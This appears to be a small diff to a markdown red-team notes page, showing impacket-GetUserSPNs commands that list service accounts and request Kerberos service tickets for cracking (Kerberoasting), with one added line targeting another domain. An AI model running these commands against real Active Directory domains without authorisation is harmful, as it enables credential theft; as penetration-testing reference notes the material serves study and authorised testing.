@@ -388,6 +388,7 @@ We can use [mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md)
 $ impacket-GetUserSPNs -dc-ip IP domain/user:password # list all
 $ impacket-GetUserSPNs -dc-ip IP domain/user:password -request # get TGS for all
 $ impacket-GetUserSPNs -dc-ip IP domain/user:password -request-user cn -outputfile cn_tgs # get TGS for 'cn'
+$ impacket-GetUserSPNs [...] -target-domain dev.example.com
 ```
 
 ```shell!
